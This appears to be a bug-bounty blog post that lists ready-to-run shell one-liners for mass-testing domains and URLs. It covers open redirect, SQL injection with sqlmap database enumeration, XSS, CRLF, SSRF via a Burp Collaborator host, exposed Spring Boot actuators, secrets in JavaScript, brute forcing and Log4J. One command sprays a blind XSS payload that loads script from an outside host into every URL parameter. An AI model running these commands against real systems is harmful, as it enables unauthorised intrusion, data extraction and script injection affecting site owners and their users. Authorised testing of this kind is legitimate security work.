
one liner commands for bug bounty
Bug Bounty Writeups Penetration Testing Security 
Powerfull Oneliner Scripts useful for Bug Bounty Hunters Comments bounty writeups, bug bounty, kali linux, linux, one liner scripts, penetration testing, shell scripting, vulnerability
Hi All,

Tody, I thought to share interesting onliner commands so that everyone can use it and with the help of this article, one can also make their own oneliner commands to perform certain tasks/functions to ease their Bug hunting journey.

Powerfull Oneliner Scripts useful for Bug Bounty Hunters
Oneliner commands is the powerful way to hunt for bugs or we can say, makes the task a lot easier in hunting for bugs. If the bug bounty program has the broad scope (*.example.com), then it will be very helpful for hunters. In order to use the below oneliner commands, there are certain tools needed to be installed on your machine. Below souces can be used to install the tools. Here is the list –

rush:
a cross-platform command-line tool for executing jobs in parallel.
qsreplace :
Accept URLs on stdin, replace all query string values with a user-supplied value, only output each combination of query string parameters once per host and path.
sqlmap :
for checking SQL injections flaws.
dalfox :
DalFox is an powerful open source XSS scanning tool and parameter analyzer and utility that fast the process of detecting and verify XSS flaws.
gospider :
Fast web spider written in Go.
hakrawler :
Fast golang web crawler for gathering URLs and JavaScript file locations.
Secretfinder script :
SecretFinder is a python script, written to discover sensitive data like apikeys, accesstoken, authorizations, jwt,..etc in JavaScript files.
dirsearch :
An advanced command-line tool designed to brute force directories and files in webservers.
ffuf :
A fast web fuzzer written in Go.
anew :
Append lines from stdin to a file, but only if they don’t already appear in the file.
## 1. `Open Redirect Check One Liner`
On Live Domains List (File containing Live Domains)
Explanation – Takes input of live domains file and passes it to rush which runs 40 workers (-j40) parallely and displays if the injected value is reflected in response header (Location).
```
cat live-domains | rush -j40 'if curl -Iks -m 10 "{}/https://redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}/redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}////;@redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}/////redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "{} It seems an Open Redirect Found"; fi'
```
`On Parameters (File containing urls with parameters)`

Explanation – Takes input of urls file which then passes to qsreplace which replaces the parameter value to the injected one. Then it passes it to rush which runs 40 workers parallely and checks if the injected value comes in response header(Location).
```
cat urls.txt | qsreplace "https://redirect.com" | rush -j40 'if curl -Iks -m 10 "{}" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi'
```
`Test Case 2`
```
cat urls.txt | qsreplace "redirect.com" | rush -j40 'if curl -Iks -m 10 "{}" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi'
```
`Test Case 3`
```
cat urls.txt | qsreplace "////;@redirect.com" | rush -j40 'if curl -Iks -m 10 "{}" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi'
```
`Test Case 4`
```
cat urls.txt | qsreplace "/////redirect.com" | rush -j40 'if curl -Iks -m 10 "{}" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi'
```
On Headers (File containing Live Domains)
Explanation – Takes input of live domains as a list and append all the headers with the injected value in the request and checks if it reflected in response header (Location)
```
cat live-domains | rush -j40 'if curl -Iks -m 10 "$line" -H "CF-Connecting_IP: https://redirect.com" -H "From: root@https://redirect.com" -H "Client-IP: https://redirect.com" -H "X-Client-IP: https://redirect.com" -H "X-Forwarded-For: https://redirect.com" -H "X-Wap-Profile: https://redirect.com" -H "Forwarded: https://redirect.com" -H "True-Client-IP: https://redirect.com" -H "Contact: root@https://redirect.com" -H "X-Originating-IP: https://redirect.com" -H "X-Real-IP: https://redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "$line" -H "CF-Connecting_IP: redirect.com" -H "From: root@redirect.com" -H "Client-IP: redirect.com" -H "X-Client-IP: redirect.com" -H "X-Forwarded-For: redirect.com" -H "X-Wap-Profile: redirect.com" -H "Forwarded: redirect.com" -H "True-Client-IP: redirect.com" -H "Contact: root@redirect.com" -H "X-Originating-IP: redirect.com" -H "X-Real-IP: redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "The URL $line with vulnerable header may be vulnerable to Open Redirection. Check Manually";fi'
```
## 2.`SQL Injection Check OneLiner`
On list of URLs
Explanation – Rush takes input urls file and parallely runs 20 workers of sqlmap. First it checks wheather if the URL is alive or not.
```
cat urls.txt | rush -j20 'if curl -Is "{}" | head -1 | grep -q "HTTP"; then echo "Running Sqlmap on '{}'"; sqlmap -u "{}" --batch --random-agent --dbs; fi'
```
## 3.`Open Redirect Check based on Location Header`
Explanation – If the URL has the response as 301,302,307, then it checks if the Location header value is present in the original url or not. If the value is present in the url or parameter, then it tries to replace it with the custom value, if it gets the reflected custom value in response header, then it alerts as open redirect found.
```
cat urls.txt | rush 'if curl -skI "{}" -H "User-Agent: Mozilla/Firefox 80" | grep -i "HTTP/1.1 \|HTTP/2" | cut -d" " -f2 | grep -q "301\|302\|307";then domain=`curl -skI "{}" -H "User-Agent: Mozilla/Firefox 80" | grep -i "Location\:\|location\:" | cut -d" " -f2 | cut -d"/" -f1-3 | sed "s/^http\(\|s\):\/\///g" | sed "s/\s*$//"`; path=`echo "{}" | cut -d"/" -f4-20`; if echo "$path" | grep -q "$domain"; then echo "Reflection Found on Location headers from URL '{}'";fi;fi'
```
## 4.`XSS Checks on list of Urls`
Explanation – Takes input of urls file and passes it to dalfox tool for xss scanning and saves it to xss.txt file.
```
cat urls.txt | dalfox pipe --multicast -o xss.txt
```
## 5.`CRLF Injection Check One Liner`
On Live Domains
Explanation – Takes input of live domains file and passes it to rush which runs 40 workers (-j40) parallely and displays if the injected value is reflected in response header.
```
cat live-domains | rush -j40 'if curl -Iks -m 10 "{}/%0D%0Acrlf:crlf" | grep -q "^crlf:crlf" || curl -Iks -m 10 "{}/%0d%0acrlf:crlf" | grep -q "^crlf:crlf" || curl -Iks -m 10 "{}/%E5%98%8D%E5%98%8Acrlf:crlf" | grep -q "^crlf:crlf"; then echo "The URL {} may be vulnerable to CRLF Injection. Check Manually";fi'
```
On Live Urls with Parameters
Explanation – Takes input of urls file and passes it to qsreplace which replaces the value of parameters as the injected one and passes it to rush which runs 40 workers (-j40) parallely and displays if the injected value is reflected in response header.
```
cat urls.txt | qsreplace "%0d%0acrlf:crlf" | rush -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'
```
Test Case 2
```
cat urls.txt | qsreplace "%E5%98%8D%E5%98%8Acrlf:crlf" | rush -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'
```
Test Case 3
```
cat urls.txt | qsreplace -a "%0d%0acrlf:crlf" | rush -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'
```
On Headers (Files containing live domains)
Explanation – If any header is vulnerable to crlf injection, then it alerts.
```
cat $1 | rush -j40 'if curl -Iks -m 10 "{}" -H "CF-Connecting_IP: %0d%0acrlf:crlf" -H "From: root@%0d%0acrlf:crlf" -H "Client-IP: %0d%0acrlf:crlf" -H "X-Client-IP: %0d%0acrlf:crlf" -H "X-Forwarded-For: %0d%0acrlf:crlf" -H "X-Wap-Profile: %0d%0acrlf:crlf" -H "Forwarded: %0d%0acrlf:crlf" -H "True-Client-IP: %0d%0acrlf:crlf" -H "Contact: root@%0d%0acrlf:crlf" -H "X-Originating-IP: %0d%0acrlf:crlf" -H "X-Real-IP: %0d%0acrlf:crlf" | grep -q "^crlf:crlf" || curl -Iks -m 10 "$line" -H "CF-Connecting_IP: %E5%98%8D%E5%98%8Acrlf:crlf" -H "From: root@%E5%98%8D%E5%98%8Acrlf:crlf" -H "Client-IP: %E5%98%8D%E5%98%8Acrlf:crlf" -H "X-Client-IP: %E5%98%8D%E5%98%8Acrlf:crlf" -H "X-Forwarded-For: %E5%98%8D%E5%98%8Acrlf:crlf" -H "X-Wap-Profile: %E5%98%8D%E5%98%8Acrlf:crlf" -H "Forwarded: %E5%98%8D%E5%98%8Acrlf:crlf" -H "True-Client-IP: %E5%98%8D%E5%98%8Acrlf:crlf" -H "Contact: root@%E5%98%8D%E5%98%8Acrlf:crlf" -H "X-Originating-IP: %E5%98%8D%E5%98%8Acrlf:crlf" -H "X-Real-IP: %E5%98%8D%E5%98%8Acrlf:crlf" | grep -q "^crlf:crlf" || curl -Iks -m 10 "$line" -H "CF-Connecting_IP: %0D%0Acrlf:crlf" -H "From: root@%0D%0Acrlf:crlf" -H "Client-IP: %0D%0Acrlf:crlf" -H "X-Client-IP: %0D%0Acrlf:crlf" -H "X-Forwarded-For: %0D%0Acrlf:crlf" -H "X-Wap-Profile: %0D%0Acrlf:crlf" -H "Forwarded: %0D%0Acrlf:crlf" -H "True-Client-IP: %0D%0Acrlf:crlf" -H "Contact: root@%0D%0Acrlf:crlf" -H "X-Originating-IP: %0D%0Acrlf:crlf" -H "X-Real-IP: %0D%0Acrlf:crlf" | grep -q "^crlf:crlf"; then echo "The URL {} with vulnerable header may be vulnerable to CRLF Injection. Check Manually";fi'
```
## 6. `SSRF Check One Liner`
On Headers (File containing live domains)
Explanation – Injceted burp collaborator server in requested headers and issues a request and saves it in the output file including each request timing so that if one gets a hit, he can confirm by checking the request timing.

Replace $2 with your burp collaborator server.
```
cat live-domains | rush -j40 'if curl -skL -o /dev/null "{}" -H "CF-Connecting_IP: $2" -H "From: root@$2" -H "Client-IP: $2" -H "X-Client-IP: $2" -H "X-Forwarded-For: $2" -H "X-Wap-Profile: http://$2/wap.xml" -H "Forwarded: $2" -H "True-Client-IP: $2" -H "Contact: root@$2" -H "X-Originating-IP: $2" -H "X-Real-IP: $2"; then echo "{}" | ts; fi' | tee -a ssrf-headers-out.txt

```
On Urls containing params
Explanation – Takes urls list, replaces the params value to the burp collaborator server and passes it to rush for parallel working.
```
cat urls.txt | qsreplace "your.burpcollaborator.server" | rush -j40 'if curl -skL "{}" -o /dev/null; then echo "{}" | ts; fi' | tee -a ssrf-output-log.txt
```
Test Case 2
```
cat params.txt | qsreplace "http://$1" | rush -j40 'if curl -skL "{}" -o /dev/null; then echo "{}" | ts; fi' | tee -a ssrf-output-log.txt
```
## 7.`SpringBoot Actuator Check One Liner`
On Live Domains
Explanation – Takes live domains list and checks wheather the springboot actuators are publicly accessible or not.
```
cat live-domains | rush -j40 'if curl -skI -m 10 "{}/env" | grep -i "x-application-context" || curl -sk -m 10 "{}/actuator/env" | grep -q "sping.config.location\|spring.application.name\|JAVA_HOME" || curl -sk -m 10 "{}/env" | grep -q "sping.config.location\|spring.application.name\|JAVA_HOME" || curl -sk -m 10 "{}/actuator" | grep -q '{"_links":{"self"' || curl -sk -m 10 "{}/actuator/configprops" | grep -q "org.springframework.boot.actuate\|beans" || curl -sk -m 10 "{}/configprops" | grep -q "org.springframework.boot.actuate\|beans"; then echo "SpringBoot Actuator Found on {}"; fi' &
```
On Live urls with params
Explanation – Takes urls list and checks wheather the application is using springboot or not.
```
cat params.txt | rush -j40 'if curl -skI -m 10 "{}" | grep -i "x-application-context"; then echo "SpringBoot application context header Found on {}"; fi'
```
## 8. `Drop Blind XSS payload on list of Urls with params`
Explanation – Takes urls file as input, replaces the param value with blind xss payload and issues the request with 40 workers running parallely.
```
cat urls.txt | qsreplace '"><script src="https://script.xss.ht"></script>' | rush -j40 'curl -sk "{}" -o /dev/null'
```
## 9.`Reflection Check (XSS) on one domain by extracting Hidden params`
Explanation – Extracts the hidden parameters from the page and checks wheather it can be vulnerable to xss or not.
```
curl -skL "https://in.yahoo.com" | grep 'type="hidden"' | grep -Eo 'name="[^\"]+"' | cut -d'"' -f2 | xargs -I@ sh -c 'if curl -skL https://in.yahoo.com/?@=testxss | grep -q "value=testxss"; then echo "reflection found from @ parameter"; fi'
```
## 10.`Find hidden parameters via Crawl on list of urls`
Explanation – Takes urls list and extracts hidden parameters from the list of urls and saves unique params in the file.
```
cat alive.txt | rush 'curl -skL "{}" | grep "type\=\"hidden\"" | grep -Eo "name\=\"[^\"]+\"" | cut -d"\"" -f2 | sort -u' | anew params.txt
```
## 11.`Find Secrets in Javascripts files via crawling`
Explanation – Takes live domains as input, crawled using hakrawler tool which extracts javascript files  and then passes it to Secretfinder script which checks for sensitive data in the javascript files.
```
cat alive.txt | rush 'hakrawler -plain -js -depth 2 -url {}' | rush 'python3 /root/Tools/SecretFinder/SecretFinder.py -i {} -o cli' | anew secretfinder
```
## 12.`Fetch Domains from Wayback Archive (Input Root-Domains)`
Explanation – Takes the input of root-domains file and extracts the domains from the wayback archive.

Root-domains example – gq1.yahoo.com, abc.yahoo.com, root.yahoo.com etc
```
cat root-dom.txt | rush 'curl -s "http://web.archive.org/cdx/search/cdx?url=*.{}/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sed 's/\.com.*/.com/' | sort -u'
```
## 13.`Directory Bruteforce using dirsearch and ffuf`
Explanation – Direcotry bruteforce using ffuf. Takes input of live domains and scans for direcotries & files.
```
cat alive.txt | xargs -I@ sh -c 'ffuf -c -w /path/to/wordlist -D -e php,aspx,html,do,ashx -u @/FUZZ -ac -t 200' | tee -a dir-ffuf.txt
```
##using dirsearch
Explanation – Direcotry bruteforce using dirsearch. Takes input of live domains and scans for direcotries & files.
```
cat alive.txt | xargs -I@ sh -c 'python3 /root/Tools/dirsearch/dirsearch.py -w /path/to/wordlist.txt -u @ -e php,html,json,aspx -t 100' | tee -a dirsearch
```
## 14.`Crawl list of Domains`
Explanation – Crawling list of domains parallely with 30 workers.
```
cat alive.txt | xargs -P30 -I@ gospider -c 30 -t 15 -a -s @ -d 3 | anew spider
```
## 15.`Subdomain bruteforce using ffuf`
Explanation – Bruteforce subdomains using ffuf tool.
```
ffuf -u https://FUZZ.domain.com -w /path/to/wordlist -v | grep "| URL |" | awk '{print $4}'
```
## 16.`Log4J Scan on list of domains`
 Explanation – Takes live domains as input and scans for log4j vulnerabilities.
```
cat alive.txt | xargs -I@ sh -c 'python3 /path/to/log4j-scan.py -u "@"
```
